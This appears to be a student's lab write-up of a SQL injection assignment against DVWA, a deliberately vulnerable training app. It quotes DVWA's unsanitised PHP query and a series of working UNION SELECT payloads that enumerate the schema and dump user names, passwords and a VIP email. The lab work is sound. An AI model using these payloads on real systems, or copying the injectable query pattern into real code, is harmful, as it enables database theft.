= Assignment: DVWA SQL Injection without randomization <assignment-5>

== Overview and Definitions

This section will document the DVWA SQL injection assignment. As a data engineer, SQL is a familiar language to me. I will be using a book _Linix Shell Scripting for Hackers_ as a guide here. It is written by Valentine Nachi and Donald Tevault (Packt Publishing 2026). Another book I am browsing is _Learn Penetration Testing_ by Rishalin Pillay (Pkact Publishing 2019). Both of these books have sections on SQL injection, and both are using DVWA as a target. I tried to infer what the "without randomization" part of the assignment means, but I am not sure. I suppose it is some "low" difficulty setting in DVWA, but books did not mention this. Maybe the table names could be randomized in a "medium" or "high" difficulty setting, or session tokens, or something else.

== Target Setup and Relevant Code

Once again, I am grey-box testing DVWA, so I have access to the source code. The "SQL Injection" module has a source code available, which contains, after some cleanup...

```php
<?php

// Get input
$id = $_REQUEST[ 'id' ];

// Check database
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";

// Get values
$first = mysql_result( $result, $i, "first_name" );
$last  = mysql_result( $result, $i, "last_name" );

?> 
```

== Observations

Based on the hints in the assignment, I first tried a simple query fetching two literals, `' UNION SELECT 0, 1 #`, which worked:

```
ID: ' UNION SELECT 0, 1 #
First name: 0
Surname: 1
```

Then, I checked the MySQL reference docs what are the column names in the `information_schema.tables` table. The ones I need are `table_schema` and `table_name`. I tried the following query:

```
' UNION SELECT table_schema, table_name FROM information_schema.tables #
```

The potentially interesting tables include `dvwa.users` and `dvwa.vips`. I wanted to find out the column names in the `dvwa.users` table, so I tried:

```
' UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name = 'users' #
```

The columns are:

- user_id
- first_name
- last_name
- user
- password
- avatar
- last_login
- failed_login

Finally, I wanted to fetch the user names and passwords, so I tried:

```
' UNION SELECT user, password FROM dvwa.users #
```

== Assignment Solution

In the assignment, I wasn't asked for the password but for the email address. Thus, I wrote:

```
' UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name = 'vips' #
```

This table has columns id, name and email. I then wrote:

```
' UNION SELECT name, email FROM dvwa.vips #
```

It returned the following:

```
ID: ' UNION SELECT name, email FROM dvwa.vips #
First name: sarah
Surname: trohitrulz6z@dibon.site
```

The database is being queried with wide permissions, and there is no input validation, so I can fetch what I want. Thus, I rate this vulnerability as *CRITICAL*.
